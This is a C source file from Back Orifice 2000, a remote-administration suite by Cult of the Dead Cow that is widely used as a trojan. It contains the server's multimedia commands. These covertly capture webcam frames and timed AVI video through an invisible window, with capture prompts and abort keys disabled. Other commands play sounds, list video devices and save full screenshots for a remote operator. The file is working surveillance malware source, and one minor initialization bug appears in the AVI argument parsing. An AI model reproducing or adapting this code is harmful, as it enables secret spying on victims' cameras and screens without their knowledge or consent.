/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#include<windows.h>
#include<auth.h>
#include<iohandler.h>
#include<encryption.h>
#include<commandloop.h>
#include<bocomreg.h>
#include<cmd\cmd_multimedia.h>
#include<strhandle.h>
#include<vfw.h>
#include<main.h>

int CmdProc_MMCapFrame(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	char svBuffer[1024];

	// Create capture window (hidden inside invisible parent window)
	HWND hwnd,hwndCap;
	
	hwnd=CreateWindow("WSCLAS", "", 0, 0, 0, 1, 1, HWND_DESKTOP, NULL, g_module, NULL);	
	if(hwnd==NULL) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not create parent window.\n");
		return 1;
	}
	
	hwndCap=capCreateCaptureWindow("Window", WS_CHILD, 0, 0, 160, 120, hwnd, 1);
	if(hwndCap==NULL) {
		DestroyWindow(hwnd);
		IssueAuthCommandReply(cas_from,comid,0,"Could not create capture window.\n");
		return 1;
	}

	// Connect to capture driver
	if(capDriverConnect(hwndCap, nArg1)==FALSE) {
		DestroyWindow(hwnd);
		DestroyWindow(hwndCap);
		wsprintf(svBuffer, "Unable to connect to driver #%d\n", nArg1);
		IssueAuthCommandReply(cas_from,comid,0,svBuffer);
		return 1;	
	}
	
	// Ensure everything was initialized
	CAPDRIVERCAPS pcdc;
	capDriverGetCaps(hwndCap, &pcdc, sizeof(CAPDRIVERCAPS));
	if(!pcdc.fCaptureInitialized) {
		DestroyWindow(hwnd);
		DestroyWindow(hwndCap);
		wsprintf(svBuffer, "Driver was not initialized for device #%d\n", nArg1);
		IssueAuthCommandReply(cas_from,comid,0,svBuffer);
		return 1;
	}
	
	// Get original bitmapinfo
	DWORD dwSize;
	BITMAPINFO *pbiOrig, *pbiInfo;
	
	dwSize=capGetVideoFormatSize(hwndCap);
	pbiOrig=(BITMAPINFO *)malloc(dwSize);
	if(pbiOrig==NULL) {
		DestroyWindow(hwndCap);
		DestroyWindow(hwnd);
		IssueAuthCommandReply(cas_from,comid,0,"Memory allocation error.\n");
		return 1;
	}
	pbiInfo=(BITMAPINFO *)malloc(dwSize);
	if(pbiInfo==NULL) {
		DestroyWindow(hwndCap);
		DestroyWindow(hwnd);
		IssueAuthCommandReply(cas_from,comid,0,"Memory allocation error.\n");
		return 1;
	}

	capGetVideoFormat(hwndCap, pbiOrig, dwSize); 
	memcpy(pbiInfo, pbiOrig, dwSize);

	// Parse video format spec
	DWORD dwWidth,dwHeight,dwBPP;
	char *svWidth,*svHeight,*svBPP;
	
	svWidth=svArg3;
	svHeight=BreakString(svWidth,",");
	svBPP=BreakString(svHeight,",");
	if(svWidth!=NULL) {
		dwWidth=atoi(svWidth);
		if(dwWidth<=0) dwWidth=640;
	} else dwWidth=640;
	if(svHeight!=NULL) {
		dwHeight=atoi(svHeight);
		if(dwHeight<=0) dwHeight=480;
	} else dwHeight=480;
	if(svBPP!=NULL) {
		dwBPP=atoi(svBPP);
		if(dwBPP<=0) dwBPP=16;
	} else dwBPP=16;

	pbiInfo->bmiHeader.biWidth = dwWidth;
	pbiInfo->bmiHeader.biHeight = dwHeight;
	pbiInfo->bmiHeader.biBitCount = (WORD) dwBPP;

	pbiInfo->bmiHeader.biSizeImage = 0;
	pbiInfo->bmiHeader.biCompression = BI_RGB;
	pbiInfo->bmiHeader.biClrUsed = 0;
	pbiInfo->bmiHeader.biClrImportant = 0;
	pbiInfo->bmiHeader.biPlanes = 1;
	
	pbiInfo->bmiColors->rgbBlue = 0;
	pbiInfo->bmiColors->rgbGreen = 0;
	pbiInfo->bmiColors->rgbRed = 0;
	pbiInfo->bmiColors->rgbReserved = 0;
	
	// Set video format, capture frame, and save to disk
	capSetVideoFormat(hwndCap, pbiInfo, dwSize);
	capGrabFrameNoStop(hwndCap);
	capFileSaveDIB(hwndCap, svArg2);
	
	// Restore original capture mode and clean up
	
	capSetVideoFormat(hwndCap, pbiOrig, dwSize);
	free(pbiOrig);
	free(pbiInfo);
	
	capDriverDisconnect(hwndCap); 
	
	DestroyWindow(hwndCap);
	DestroyWindow(hwnd);
	
	IssueAuthCommandReply(cas_from,comid,0,"Frame captured to file.\n");
		
	return 0;
}

int CmdProc_MMCapAVI(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	char svBuffer[1024];

	// Create capture window (hidden inside invisible parent window)
	HWND hwnd,hwndCap;
	
	hwnd=CreateWindow("WSCLAS", "", 0, 0, 0, 1, 1, HWND_DESKTOP, NULL, g_module, NULL);	
	if(hwnd==NULL) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not create parent window.\n");
		return 1;
	}
	
	hwndCap=capCreateCaptureWindow("Window", WS_CHILD, 0, 0, 160, 120, hwnd, 1);
	if(hwndCap==NULL) {
		DestroyWindow(hwnd);
		IssueAuthCommandReply(cas_from,comid,0,"Could not create capture window.\n");
		return 1;
	}

	// Connect to capture driver
	if(capDriverConnect(hwndCap, nArg1)==FALSE) {
		DestroyWindow(hwnd);
		DestroyWindow(hwndCap);
		wsprintf(svBuffer, "Unable to connect to driver #%d\n", nArg1);
		IssueAuthCommandReply(cas_from,comid,0,svBuffer);
		return 1;	
	}
	
	// Ensure everything was initialized
	CAPDRIVERCAPS pcdc;
	capDriverGetCaps(hwndCap, &pcdc, sizeof(CAPDRIVERCAPS));
	if(!pcdc.fCaptureInitialized) {
		DestroyWindow(hwnd);
		DestroyWindow(hwndCap);
		wsprintf(svBuffer, "Driver was not initialized for device #%d\n", nArg1);
		IssueAuthCommandReply(cas_from,comid,0,svBuffer);
		return 1;
	}
	
	// Get original bitmapinfo
	DWORD dwSize;
	BITMAPINFO *pbiOrig, *pbiInfo;
	
	dwSize=capGetVideoFormatSize(hwndCap);
	pbiOrig=(BITMAPINFO *)malloc(dwSize);
	if(pbiOrig==NULL) {
		DestroyWindow(hwndCap);
		DestroyWindow(hwnd);
		IssueAuthCommandReply(cas_from,comid,0,"Memory allocation error.\n");
		return 1;
	}
	pbiInfo=(BITMAPINFO *)malloc(dwSize);
	if(pbiInfo==NULL) {
		DestroyWindow(hwndCap);
		DestroyWindow(hwnd);
		IssueAuthCommandReply(cas_from,comid,0,"Memory allocation error.\n");
		return 1;
	}

	capGetVideoFormat(hwndCap, pbiOrig, dwSize); 
	memcpy(pbiInfo, pbiOrig, dwSize);

	// Parse video format spec
	DWORD dwSeconds,dwWidth,dwHeight,dwBPP,dwFPS;
	char *svSeconds,*svWidth,*svHeight,*svBPP,*svFPS;
	
	svSeconds=svArg3;
	svWidth=BreakString(svSeconds,",");
	svHeight=BreakString(svWidth,",");
	svBPP=BreakString(svHeight,",");
	svFPS=BreakString(svBPP,",");
	if(svSeconds!=NULL) {
		dwSeconds=atoi(svSeconds);
		if(dwSeconds<=0) dwSeconds=5;
	} else dwWidth=5;
	if(svWidth!=NULL) {
		dwWidth=atoi(svWidth);
		if(dwWidth<=0) dwWidth=160;
	} else dwWidth=160;
	if(svHeight!=NULL) {
		dwHeight=atoi(svHeight);
		if(dwHeight<=0) dwHeight=120;
	} else dwHeight=120;
	if(svBPP!=NULL) {
		dwBPP=atoi(svBPP);
		if(dwBPP<=0) dwBPP=16;
	} else dwBPP=16;
	if(svFPS!=NULL) {
		dwFPS=atoi(svFPS);
		if(dwFPS<=0) dwFPS=15;
	} else dwFPS=15;

	pbiInfo->bmiHeader.biWidth = dwWidth;
	pbiInfo->bmiHeader.biHeight = dwHeight;
	pbiInfo->bmiHeader.biBitCount = (WORD) dwBPP;

	pbiInfo->bmiHeader.biSizeImage = 0;
	pbiInfo->bmiHeader.biCompression = BI_RGB;
	pbiInfo->bmiHeader.biClrUsed = 0;
	pbiInfo->bmiHeader.biClrImportant = 0;
	pbiInfo->bmiHeader.biPlanes = 1;
	
	pbiInfo->bmiColors->rgbBlue = 0;
	pbiInfo->bmiColors->rgbGreen = 0;
	pbiInfo->bmiColors->rgbRed = 0;
	pbiInfo->bmiColors->rgbReserved = 0;
	
	// Set video format, setup capture, and capture video
	CAPTUREPARMS capparms;
	
	capSetVideoFormat(hwndCap, pbiInfo, dwSize);
	capCaptureGetSetup(hwndCap, &capparms, sizeof(CAPTUREPARMS));		
	capparms.fMakeUserHitOKToCapture = FALSE;
	capparms.vKeyAbort = 0;
	capparms.fAbortLeftMouse = FALSE;
	capparms.fAbortRightMouse = FALSE;
	capparms.fLimitEnabled = TRUE;
	capparms.wTimeLimit = dwSeconds;
	capparms.dwRequestMicroSecPerFrame = (1000000/dwFPS);
																		
	capCaptureSetSetup(hwndCap, &capparms, sizeof(CAPTUREPARMS));
	capFileSetCaptureFile(hwndCap, svArg2); 
	
	IssueAuthCommandReply(cas_from,comid,0,"Capturing, please wait...\n");
									
	capCaptureSequence(hwndCap); 
	
	// Restore old video format
	
	capSetVideoFormat(hwndCap, pbiOrig, dwSize);
	free(pbiOrig);
	free(pbiInfo);
	
	capDriverDisconnect(hwndCap); 
	
	DestroyWindow(hwndCap);
	DestroyWindow(hwnd);
	
	IssueAuthCommandReply(cas_from,comid,0,"AVI captured to file.\n");
	return 0;
}

int CmdProc_MMPlaySound(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	if (PlaySound(svArg2, NULL, SND_FILENAME|SND_NODEFAULT|SND_NOWAIT|SND_ASYNC)==FALSE) {
		IssueAuthCommandReply(cas_from,comid,0,"Unable to play sound.\n");
		return 1;
	} 

	IssueAuthCommandReply(cas_from,comid,0,"Playing sound.\n");						
	return 0;
}

int CmdProc_MMLoopSound(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	if (PlaySound(svArg2, NULL, SND_LOOP|SND_FILENAME|SND_NODEFAULT|SND_NOWAIT|SND_ASYNC)==FALSE) {
		IssueAuthCommandReply(cas_from,comid,0,"Unable to play sound.\n");
		return 1;
	} 

	IssueAuthCommandReply(cas_from,comid,0,"Playing sound repeatedly.\n");						
	return 0;
}

int CmdProc_MMStopSound(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	if (PlaySound(NULL, NULL, SND_PURGE)==FALSE) {
		IssueAuthCommandReply(cas_from,comid,0,"Unable to stop sound.\n");
		return 1;
	} 

	IssueAuthCommandReply(cas_from,comid,0,"Sound stopped.\n");						
	return 0;
}



int CmdProc_MMListCaps(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	char svBuffer[1024];
	char svName[256];
	char svComment[512];
	int i,nCount;
	
	IssueAuthCommandReply(cas_from,comid,1,"Listing video input devices:\n");
	
	nCount=0;
	for (i=0;i<10;i++) {
		if(capGetDriverDescription(i, svName, 255, svComment, 511)) {
			wsprintf(svBuffer, "%d: %s %s\n", i, svName, svComment);
			IssueAuthCommandReply(cas_from,comid,1,svBuffer);
			nCount++;
		}
	}
	
	wsprintf(svBuffer,"%d devices listed.\n", nCount);
	IssueAuthCommandReply(cas_from,comid,0,svBuffer);
	
	return 0;
}

int CmdProc_MMCapScreen(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	// Create device context
	HDC hdc;
	hdc=CreateDC("DISPLAY", NULL, NULL, NULL);
	if(hdc==NULL) {
		IssueAuthCommandReply(cas_from,comid,0,"Couldn't create device context.\n");
		return 1;
	}
							
	// Get dimensions
	DWORD dwWidth, dwHeight, dwBPP, dwNumColors;

	dwWidth = GetDeviceCaps(hdc, HORZRES);
	dwHeight = GetDeviceCaps(hdc, VERTRES);
	dwBPP = GetDeviceCaps(hdc, BITSPIXEL);
	if(dwBPP<=8) {
		dwNumColors = GetDeviceCaps(hdc, NUMCOLORS);
		dwNumColors = 256;
	} else {
		dwNumColors = 0;
	}

	// Create compatible DC
	HDC hdc2;
	hdc2=CreateCompatibleDC(hdc);
	if(hdc2==NULL) {
		DeleteDC(hdc);
		IssueAuthCommandReply(cas_from,comid,0,"Couldn't create compatible device context.\n");
		return 1;
	}

	// Create bitmap
	HBITMAP bitmap;
	BITMAPINFO bmpinfo;
	LPVOID pBits;

	bmpinfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmpinfo.bmiHeader.biWidth = dwWidth;
	bmpinfo.bmiHeader.biHeight = dwHeight;
	bmpinfo.bmiHeader.biPlanes = 1;
	bmpinfo.bmiHeader.biBitCount = (WORD) dwBPP;
	bmpinfo.bmiHeader.biCompression = BI_RGB;
	bmpinfo.bmiHeader.biSizeImage = 0;
	bmpinfo.bmiHeader.biXPelsPerMeter = 0;
	bmpinfo.bmiHeader.biYPelsPerMeter = 0;
	bmpinfo.bmiHeader.biClrUsed = dwNumColors;
	bmpinfo.bmiHeader.biClrImportant = dwNumColors;
	
	bitmap = CreateDIBSection(hdc, &bmpinfo, DIB_PAL_COLORS, &pBits, NULL, 0);
	if(bitmap==NULL) {
		DeleteDC(hdc);
		DeleteDC(hdc2);
		IssueAuthCommandReply(cas_from,comid,0,"Couldn't create compatible bitmap.\n");
		return 1;
	}
	HGDIOBJ gdiobj;
	gdiobj = SelectObject(hdc2, (HGDIOBJ)bitmap);
	if((gdiobj==NULL) || (gdiobj==(void *)GDI_ERROR)) {
		DeleteDC(hdc);
		DeleteDC(hdc2);
		IssueAuthCommandReply(cas_from,comid,0,"Couldn't select bitmap.\n");
		return 1;
	}
	if (!BitBlt(hdc2, 0,0, dwWidth, dwHeight, hdc, 0,0, SRCCOPY)) {
		DeleteDC(hdc);
		DeleteDC(hdc2);
		IssueAuthCommandReply(cas_from,comid,0,"Couldn't copy bitmap.\n");
		return 1;
	}
	
	RGBQUAD colors[256];
	if(dwNumColors!=0) {
		dwNumColors = GetDIBColorTable(hdc2, 0, dwNumColors, colors);
	}
	
	
	// Fill in bitmap structures
	BITMAPFILEHEADER bitmapfileheader;
	BITMAPINFOHEADER bitmapinfoheader;

	bitmapfileheader.bfType = 0x4D42;
	bitmapfileheader.bfSize = ((dwWidth * dwHeight * dwBPP)/8) + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + (dwNumColors * sizeof(RGBQUAD));
	bitmapfileheader.bfReserved1 = 0;
	bitmapfileheader.bfReserved2 = 0;
	bitmapfileheader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + (dwNumColors * sizeof(RGBQUAD));  
	
	bitmapinfoheader.biSize = sizeof(BITMAPINFOHEADER);
	bitmapinfoheader.biWidth = dwWidth;
	bitmapinfoheader.biHeight = dwHeight;
	bitmapinfoheader.biPlanes = 1;
	bitmapinfoheader.biBitCount = (WORD)dwBPP;
	bitmapinfoheader.biCompression = BI_RGB;
	bitmapinfoheader.biSizeImage = 0;
	bitmapinfoheader.biXPelsPerMeter = 0;
	bitmapinfoheader.biYPelsPerMeter = 0;
	bitmapinfoheader.biClrUsed = dwNumColors;
	bitmapinfoheader.biClrImportant = 0;
	
	// Write bitmap to disk
	HANDLE hfile;
	DWORD dwBytes;
	
	hfile=CreateFile(svArg2,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hfile==INVALID_HANDLE_VALUE) {
		DeleteObject(bitmap);
		DeleteDC(hdc2);
		DeleteDC(hdc);
		IssueAuthCommandReply(cas_from,comid,0,"Couldn't write file to disk.\n");
		return 1;
	}
	WriteFile(hfile,&bitmapfileheader,sizeof(BITMAPFILEHEADER), &dwBytes, NULL);
	WriteFile(hfile,&bitmapinfoheader,sizeof(BITMAPINFOHEADER), &dwBytes, NULL);
	if(dwNumColors!=0)
		WriteFile(hfile,colors,sizeof(RGBQUAD)*dwNumColors,&dwBytes,NULL);
	WriteFile(hfile,pBits,(dwWidth*dwHeight*dwBPP)/8,&dwBytes,NULL);
	CloseHandle(hfile);
		
	IssueAuthCommandReply(cas_from,comid,0,"Bitmap captured to disk file.\n");
	
	// Clean up
		
	DeleteObject(bitmap);
	DeleteDC(hdc2);
	DeleteDC(hdc);
	
	return 0;
}
